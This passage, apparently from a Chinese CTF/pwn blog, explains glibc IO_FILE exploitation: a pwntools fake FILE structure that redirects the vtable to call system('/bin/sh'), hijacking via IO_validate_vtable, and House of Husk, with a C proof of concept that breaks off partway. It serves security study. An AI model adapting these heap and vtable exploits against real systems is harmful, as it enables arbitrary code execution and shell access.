<p>要想触发程序执行 <code>_IO_str_finish</code> 函数就需要将 <code>vtable</code> 指向 <code>_IO_str_jumps</code> 往上的某个偏移，使得下一个要调用的 <code>vtable</code> 中的函数（最好是第一个被调用的函数，因为 <code>vtable</code> 已经被破坏）的位置恰好是 <code>_IO_str_finish </code> 。<br>由于 edit 函数在 <code>read</code> 改完 <code>_IO_2_1_stdout_</code> 后紧接着调用 <code>printf</code>，而 <code>printf</code> 紧接着会调用 <code>_IO_new_file_xsputn</code> ，因此需要将 <code>vtable</code> 指向 <code>&amp;_IO_str_jumps - 0x28</code> 的位置上。<img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/dfc6e89aed90a3a4793adbde3d4f7376.png"
                     
                ></p>
<p>IO_FILE 的伪造对应与代码中可以有如下定义：</p>
<div class="code-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># find _IO_str_jumps</span></span><br><span class="line">IO_file_jumps = libc.symbols[<span class="string">&#x27;_IO_file_jumps&#x27;</span>]</span><br><span class="line">IO_str_underflow = libc.symbols[<span class="string">&#x27;_IO_str_underflow&#x27;</span>] - libc.address</span><br><span class="line">IO_str_underflow_ptr = <span class="built_in">list</span>(libc.search(p64(IO_str_underflow)))</span><br><span class="line">IO_str_jumps = IO_str_underflow_ptr[bisect_left(IO_str_underflow_ptr, IO_file_jumps + <span class="number">0x20</span>)] - <span class="number">0x20</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># construct the fake file structure</span></span><br><span class="line">fake_file = <span class="string">b&quot;&quot;</span></span><br><span class="line">fake_file += p64(<span class="number">0xFBAD2886</span>)  <span class="comment"># _flags, an magic word, we need to (0xFBAD2887 &amp; (~0x1)) to clear the _IO_USER_BUF flag to pass the check in _IO_str_finish</span></span><br><span class="line">fake_file += p64(libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">131</span>) * <span class="number">6</span>  <span class="comment"># from _IO_read_ptr to _IO_write_end</span></span><br><span class="line">fake_file += p64(libc.search(<span class="string">&quot;/bin/sh&quot;</span>).<span class="built_in">next</span>())  <span class="comment"># _IO_buf_base -&gt; &quot;/bin/sh&quot;</span></span><br><span class="line">fake_file += p64(libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">132</span>)  <span class="comment"># _IO_buf_end should usually be (_IO_buf_base + 1)</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">4</span>  <span class="comment"># from _IO_save_base to _markers</span></span><br><span class="line">fake_file += p64(libc.sym[<span class="string">&#x27;_IO_2_1_stdin_&#x27;</span>])  <span class="comment"># the FILE chain ptr</span></span><br><span class="line">fake_file += p32(<span class="number">1</span>)  <span class="comment"># _fileno for stdout is 1</span></span><br><span class="line">fake_file += p32(<span class="number">0</span>)  <span class="comment"># _flags2, usually 0</span></span><br><span class="line">fake_file += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>)  <span class="comment"># _old_offset, -1</span></span><br><span class="line">fake_file += p16(<span class="number">0</span>)  <span class="comment"># _cur_column</span></span><br><span class="line">fake_file += <span class="string">b&quot;\x00&quot;</span>  <span class="comment"># _vtable_offset</span></span><br><span class="line">fake_file += <span class="string">b&quot;\n&quot;</span>  <span class="comment"># _shortbuf[1]</span></span><br><span class="line">fake_file += p32(<span class="number">0</span>)  <span class="comment"># padding</span></span><br><span class="line">fake_file += p64(libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] + <span class="number">0x1e20</span>)  <span class="comment"># _IO_stdfile_1_lock</span></span><br><span class="line">fake_file += p64(<span class="number">0xFFFFFFFFFFFFFFFF</span>)  <span class="comment"># _offset, -1</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>)  <span class="comment"># _codecvt, usually 0</span></span><br><span class="line">fake_file += p64(libc.sym[<span class="string">&#x27;_IO_2_1_stdout_&#x27;</span>] - <span class="number">0xe20</span>)  <span class="comment"># _IO_wide_data_1</span></span><br><span class="line">fake_file += p64(<span class="number">0</span>) * <span class="number">3</span>  <span class="comment"># from _freeres_list to __pad5</span></span><br><span class="line">fake_file += p32(<span class="number">0xFFFFFFFF</span>)  <span class="comment"># _mode, -1</span></span><br><span class="line">fake_file += <span class="string">b&quot;\x00&quot;</span> * <span class="number">19</span>  <span class="comment"># _unused2</span></span><br><span class="line">fake_file = fake_file.ljust(<span class="number">0xD8</span>, <span class="string">b&#x27;\x00&#x27;</span>)  <span class="comment"># adjust to vtable</span></span><br><span class="line">fake_file += p64(IO_str_jumps - <span class="number">0x28</span>) + p64(<span class="number">0</span>) + p64(libc.sym[<span class="string">&#x27;system&#x27;</span>])  <span class="comment"># set the vtable to _IO_str_jumps - 0x28 and set the _IO_2_1_stdout_ + 0xe8 to one_gadget</span></span><br></pre></td></tr></table></figure></div>

<p>libc-2.28 版本起 _IO_str_finish 不再调用 _free_buffer 而是直接是直接调用 free ，因此该方法失效。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span></span><br><span class="line">_IO_str_finish (FILE *fp, <span class="type">int</span> dummy)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (fp-&gt;_IO_buf_base &amp;&amp; !(fp-&gt;_flags &amp; _IO_USER_BUF))</span><br><span class="line">    <span class="built_in">free</span> (fp-&gt;_IO_buf_base);</span><br><span class="line">  fp-&gt;_IO_buf_base = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  _IO_default_finish (fp, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="利用-IO-validate-vtable-劫持程序流"><a href="#利用-IO-validate-vtable-劫持程序流" class="headerlink" title="利用 IO_validate_vtable 劫持程序流"></a>利用 IO_validate_vtable 劫持程序流</h2><p>以<a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/glibc_pwn/33%20xl" >这道题<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>为例，自 glibc-2.24 起在调用 <code>vtable</code> 中的函数前会调用 <code>IO_validate_vtable</code> 检查 <code>vtable</code> 执向的 <code>_IO_jump_t</code> 的地址是否合法，</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *<span class="title function_">IO_validate_vtable</span><span class="params">(<span class="type">const</span> <span class="keyword">struct</span> _IO_jump_t *vtable)</span> &#123;</span><br><span class="line">    <span class="comment">/* Fast path: The vtable pointer is within the __libc_IO_vtables</span></span><br><span class="line"><span class="comment">       section.  */</span></span><br><span class="line">    <span class="type">uintptr_t</span> section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;</span><br><span class="line">    <span class="type">uintptr_t</span> ptr = (<span class="type">uintptr_t</span>) vtable;</span><br><span class="line">    <span class="type">uintptr_t</span> offset = ptr - (<span class="type">uintptr_t</span>) __start___libc_IO_vtables;</span><br><span class="line">    <span class="keyword">if</span> (__glibc_unlikely (offset &gt;= section_length))</span><br><span class="line">        <span class="comment">/* The vtable pointer is not in the expected section.  Use the</span></span><br><span class="line"><span class="comment">           slow path, which will terminate the process if necessary.  */</span></span><br><span class="line">        _IO_vtable_check();</span><br><span class="line">    <span class="keyword">return</span> vtable;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> attribute_hidden _IO_vtable_check(<span class="type">void</span>) &#123;</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> SHARED</span></span><br><span class="line">    <span class="comment">/* Honor the compatibility flag.  */</span></span><br><span class="line">    <span class="type">void</span> (*flag)(<span class="type">void</span>) = atomic_load_relaxed (&amp;IO_accept_foreign_vtables);</span><br><span class="line"><span class="meta">#<span class="keyword">ifdef</span> PTR_DEMANGLE</span></span><br><span class="line">    PTR_DEMANGLE (flag);</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br><span class="line">    <span class="keyword">if</span> (flag == &amp;_IO_vtable_check)</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* In case this libc copy is in a non-default namespace, we always</span></span><br><span class="line"><span class="comment">       need to accept foreign vtables because there is always a</span></span><br><span class="line"><span class="comment">       possibility that FILE * objects are passed across the linking</span></span><br><span class="line"><span class="comment">       boundary.  */</span></span><br><span class="line">    &#123;</span><br><span class="line">        Dl_info di;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">link_map</span> *<span class="title">l</span>;</span></span><br><span class="line">        <span class="keyword">if</span> (!rtld_active()</span><br><span class="line">            || (_dl_addr(_IO_vtable_check, &amp;di, &amp;l, <span class="literal">NULL</span>) != <span class="number">0</span></span><br><span class="line">                &amp;&amp; l-&gt;l_ns != LM_ID_BASE))</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="keyword">inline</span> <span class="type">bool</span> <span class="title function_">rtld_active</span> <span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  <span class="comment">/* The default-initialized variable does not have a non-zero</span></span><br><span class="line"><span class="comment">     dl_init_all_dirs member, so this allows us to recognize an</span></span><br><span class="line"><span class="comment">     initialized and active ld.so copy.  */</span></span><br><span class="line">  <span class="keyword">return</span> GLRO(dl_init_all_dirs) != <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> _dl_addr(<span class="type">const</span> <span class="type">void</span> *address, Dl_info *info, <span class="keyword">struct</span> link_map **mapp, <span class="type">const</span> ElfW(Sym) **symbolp) &#123;</span><br><span class="line">    <span class="type">const</span> <span class="title function_">ElfW</span><span class="params">(Addr)</span> addr = DL_LOOKUP_ADDRESS (address);</span><br><span class="line">    <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Protect against concurrent loads and unloads.  */</span></span><br><span class="line">    __rtld_lock_lock_recursive (GL(dl_load_lock));</span><br><span class="line">    ...</span><br><span class="line">        </span><br><span class="line"></span><br><span class="line">声明位置: libc-lockP.h  </span><br><span class="line"> 定义:  </span><br><span class="line"><span class="meta"># <span class="keyword">define</span> __rtld_lock_lock_recursive(NAME) \</span></span><br><span class="line"><span class="meta">  __libc_maybe_call (__pthread_mutex_lock, (&amp;(NAME).mutex), 0)</span></span><br><span class="line"> 替换:  </span><br><span class="line">((&#123;</span><br><span class="line">    __typeof(__pthread_mutex_lock) *_fn = (__pthread_mutex_lock);</span><br><span class="line">    _fn != ((<span class="type">void</span> *) <span class="number">0</span>) ? (*_fn)(&amp;(_dl_load_lock).mutex) : <span class="number">0</span>;</span><br><span class="line">&#125;))</span><br></pre></td></tr></table></figure></div>

<p>可以看到，如果 <code>rtld_active</code> 返回 true（具体看调试，因为可能存在<code>GLRO(dl_init_all_dirs)</code>不可写且为 NULL 的情况）则</p>
<p>会调用 <code>_dl_addr</code>，最终执行 <code>__rtld_lock_lock_recursive (GL(dl_load_lock))</code> ，这个宏就是 exit hook 对应的宏，因此可以像 exit hook 那样修改函数指针就可以劫持程序流。</p>
<p>同样的，glibc-2.34 起该方法失效。</p>
<h2 id="House-of-Husk"><a href="#House-of-Husk" class="headerlink" title="House of Husk"></a>House of Husk</h2><p>在 glibc 中，可以通过 <code>__register_printf_function</code>  函数为 <code>printf</code> 格式化字符串中的 <code>spec</code> （例如 <code>%X</code> 中的 <code>X</code>）注册对应的函数。而维护字符与函数的映射关系的结构有 <code>__printf_function_table</code> 和 <code>__printf_arginfo_table</code> 。位置关系如下图所示（实际位置在哪里以及相对位置如何不重要，glibc 只通过 <code>__printf_function_table</code> 和 <code>__printf_arginfo_table</code> 这两个指针访问这两个函数表），其中有 2 字节填充。<br><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="images/edf77a3058ba82a89a35304d8491a08c.png"
                      alt="在这里插入图片描述" style="zoom: 67%;" 
                ></p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line">__register_printf_specifier (<span class="type">int</span> spec, printf_function converter,</span><br><span class="line">			     printf_arginfo_size_function arginfo)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (spec &lt; <span class="number">0</span> || spec &gt; (<span class="type">int</span>) UCHAR_MAX)</span><br><span class="line">    &#123;</span><br><span class="line">      __set_errno (EINVAL);</span><br><span class="line">      <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="type">int</span> result = <span class="number">0</span>;</span><br><span class="line">  __libc_lock_lock (lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (__printf_function_table == <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      __printf_arginfo_table = (printf_arginfo_size_function **)</span><br><span class="line">	<span class="built_in">calloc</span> (UCHAR_MAX + <span class="number">1</span>, <span class="keyword">sizeof</span> (<span class="type">void</span> *) * <span class="number">2</span>);</span><br><span class="line">      <span class="keyword">if</span> (__printf_arginfo_table == <span class="literal">NULL</span>)</span><br><span class="line">	&#123;</span><br><span class="line">	  result = <span class="number">-1</span>;</span><br><span class="line">	  <span class="keyword">goto</span> out;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">      __printf_function_table = (printf_function **)</span><br><span class="line">	(__printf_arginfo_table + UCHAR_MAX + <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  __printf_function_table[spec] = converter;</span><br><span class="line">  __printf_arginfo_table[spec] = arginfo;</span><br><span class="line"></span><br><span class="line"> out:</span><br><span class="line">  __libc_lock_unlock (lock);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span></span><br><span class="line">__register_printf_function (<span class="type">int</span> spec, printf_function converter,</span><br><span class="line">			    printf_arginfo_function arginfo)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">return</span> __register_printf_specifier (spec, converter,</span><br><span class="line">				      (printf_arginfo_size_function*) arginfo);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p><code>printf</code> 实际在 glibc 中为 <code>__printf</code> ，它调用的是 <code>vfprintf</code> 。在 <code>vfprintf</code> 函数中，如果 <code>__printf_function_table</code> 不为空，那么会调用 <code>printf_positional</code> 函数。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span></span><br><span class="line"><span class="title function_">vfprintf</span> <span class="params">(FILE *s, <span class="type">const</span> CHAR_T *format, va_list ap)</span></span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (__printf_function_table != <span class="literal">NULL</span></span><br><span class="line">			|| __printf_modifier_table != <span class="literal">NULL</span></span><br><span class="line">			|| __printf_va_arg_table != <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">goto</span> do_positional;</span><br><span class="line">	...</span><br><span class="line">	do_positional:</span><br><span class="line">	...</span><br><span class="line">  done = printf_positional (s, format, readonly_format, ap, &amp;ap_save,</span><br><span class="line">			    done, nspecs_done, lead_str_end, work_buffer,</span><br><span class="line">			    save_errno, grouping, thousands_sep);</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在 <code>printf_positional</code> 及其调用的 <code>__parse_one_specmb</code> 函数中，<code>__printf_function_table</code> 和 <code>__printf_arginfo_table</code> 中的函数都会被调用，因此可以将 <code>__printf_function_table</code> 或者 <code>__printf_function_table</code> 指针覆盖为伪造的 <code>__printf_function_table</code> 和 <code>__printf_arginfo_table</code> 并在其中写入 one_gadget 来获取 shell 。</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">size_t</span></span><br><span class="line">attribute_hidden</span><br><span class="line">__parse_one_specmb (<span class="type">const</span> UCHAR_T *format, <span class="type">size_t</span> posn,</span><br><span class="line">		    <span class="keyword">struct</span> printf_spec *spec, <span class="type">size_t</span> *max_ref_arg)</span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (__printf_function_table == <span class="literal">NULL</span>, <span class="number">1</span>)</span><br><span class="line">      || spec-&gt;info.spec &gt; UCHAR_MAX</span><br><span class="line">      || __printf_arginfo_table[spec-&gt;info.spec] == <span class="literal">NULL</span></span><br><span class="line">      <span class="comment">/* We don&#x27;t try to get the types for all arguments if the format</span></span><br><span class="line"><span class="comment">	 uses more than one.  The normal case is covered though.  If</span></span><br><span class="line"><span class="comment">	 the call returns -1 we continue with the normal specifiers.  */</span></span><br><span class="line">      || (<span class="type">int</span>) (spec-&gt;ndata_args = (*__printf_arginfo_table[spec-&gt;info.spec])</span><br><span class="line">				   (&amp;spec-&gt;info, <span class="number">1</span>, &amp;spec-&gt;data_arg_type,</span><br><span class="line">				    &amp;spec-&gt;size)) &lt; <span class="number">0</span>)</span><br><span class="line">	...</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">static</span> <span class="type">int</span></span><br><span class="line"><span class="title function_">printf_positional</span> <span class="params">(_IO_FILE *s, <span class="type">const</span> CHAR_T *format, <span class="type">int</span> readonly_format,</span></span><br><span class="line"><span class="params">		   va_list ap, va_list *ap_savep, <span class="type">int</span> done, <span class="type">int</span> nspecs_done,</span></span><br><span class="line"><span class="params">		   <span class="type">const</span> UCHAR_T *lead_str_end,</span></span><br><span class="line"><span class="params">		   CHAR_T *work_buffer, <span class="type">int</span> save_errno,</span></span><br><span class="line"><span class="params">		   <span class="type">const</span> <span class="type">char</span> *grouping, THOUSANDS_SEP_T thousands_sep)</span></span><br><span class="line">&#123;</span><br><span class="line">	...</span><br><span class="line">      nargs += __parse_one_specmb (f, nargs, &amp;specs[nspecs], &amp;max_ref_arg);</span><br><span class="line">	...</span><br><span class="line">	  <span class="keyword">if</span> (spec &lt;= UCHAR_MAX</span><br><span class="line">	      &amp;&amp; __printf_function_table != <span class="literal">NULL</span></span><br><span class="line">	      &amp;&amp; __printf_function_table[(<span class="type">size_t</span>) spec] != <span class="literal">NULL</span>)</span><br><span class="line">	    &#123;</span><br><span class="line">	      <span class="type">const</span> <span class="type">void</span> **ptr = alloca (specs[nspecs_done].ndata_args</span><br><span class="line">					 * <span class="keyword">sizeof</span> (<span class="type">const</span> <span class="type">void</span> *));</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* Fill in an array of pointers to the argument values.  */</span></span><br><span class="line">	      <span class="keyword">for</span> (<span class="type">unsigned</span> <span class="type">int</span> i = <span class="number">0</span>; i &lt; specs[nspecs_done].ndata_args;</span><br><span class="line">		   ++i)</span><br><span class="line">		ptr[i] = &amp;args_value[specs[nspecs_done].data_arg + i];</span><br><span class="line"></span><br><span class="line">	      <span class="comment">/* Call the function.  */</span></span><br><span class="line">	      function_done = __printf_function_table[(<span class="type">size_t</span>) spec]</span><br><span class="line">		(s, &amp;specs[nspecs_done].info, ptr);</span><br><span class="line"></span><br><span class="line">	      <span class="keyword">if</span> (function_done != <span class="number">-2</span>)</span><br><span class="line">		&#123;</span><br><span class="line">		  <span class="comment">/* If an error occurred we don&#x27;t have information</span></span><br><span class="line"><span class="comment">		     about # of chars.  */</span></span><br><span class="line">		  <span class="keyword">if</span> (function_done &lt; <span class="number">0</span>)</span><br><span class="line">		    &#123;</span><br><span class="line">		      <span class="comment">/* Function has set errno.  */</span></span><br><span class="line">		      done = <span class="number">-1</span>;</span><br><span class="line">		      <span class="keyword">goto</span> all_done;</span><br><span class="line">		    &#125;</span><br><span class="line"></span><br><span class="line">		  done_add (function_done);</span><br><span class="line">		  <span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	    &#125;</span><br><span class="line">     ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>下面介绍一下 hous of husk 的具体利用手法，具体见细节见 <a class="link"   target="_blank" rel="noopener" href="https://gitcode.net/qq_45323960/attachment/-/tree/master/house_of_poc/house_of_husk" >Poc<i class="fa-solid fa-arrow-up-right ml-[0.2em] font-light align-text-top text-[0.7em] link-icon"></i></a>。</p>
<ol>
<li><p>首先释放一个 chunk 进入 unsorted bin 泄露 libc 基地址。</p>
</li>
<li><p>构造 unsorted bin attack 修改 <code>global_max_fast</code> 为一个很大的值。</p>
</li>
<li><p>由于 <code>global_max_fast</code> 是一个很大的值，因此即使释放很大的 chunk 也会进入 fast bin ，并且由于下标超过了 bin 数组的范围，因此可以将 <code>__printf_function_table</code> 和 <code>__printf_arginfo_table</code> 覆盖成释放的堆块的内存的指针。利用这一特性可以满足下面的条件：</p>
<ul>
<li>为了通过 <code>vfprintf</code> 处的函数判断使函数调用 <code>printf_positional</code> ，可以将 <code>__printf_function_table</code> 覆盖为非 0 值。</li>
<li>将 <code>__printf_function_table</code> 或者 <code>__printf_arginfo_table</code> 覆盖为指向写有 one_gadget 的内存的指针。其中 <code>one_gadget</code> 在内存中的偏移对应与之后触发漏洞的 <code>spec</code> 。</li>
<li>如果是利用 <code>__printf_function_table</code> 触发漏洞需要让 <code>__printf_arginfo_table</code> 指向一块内存并且该内存对应 <code>spec</code> 偏移处设为 null ，否则会在 <code>__parse_one_specmb</code> 函数的 if 判断中造成不可预知的错误。</li>
</ul>
</li>
<li><p>最后调用 <code>printf</code> 触发漏洞获取 shell 。</p>
</li>
</ol>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/2024/11/08/linux-IO_FILE-exploit/images/9b8515a4b1953a79a2fec81c9123eb2e.png"
                     
                ><br>poc 如下：</p>
<div class="code-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> offset2size(ofs) ((ofs) * 2 - 0x10)</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAIN_ARENA       0x3afc40</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAIN_ARENA_DELTA 0x60</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> GLOBAL_MAX_FAST  0x3b1940</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRINTF_FUNCTABLE 0x3b4658</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PRINTF_ARGINFO   0x3b0870</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ONE_GADGET       0xdeed2</span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span> <span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">long</span> libc_base;</span><br><span class="line">  <span class="type">char</span> *a[<span class="number">10</span>];</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="literal">NULL</span>); <span class="comment">// make printf quiet</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* leak libc */</span></span><br><span class="line">  a[<span class="number">0</span>] = <span class="built_in">malloc</span>(<span class="number">0x500</span>); <span 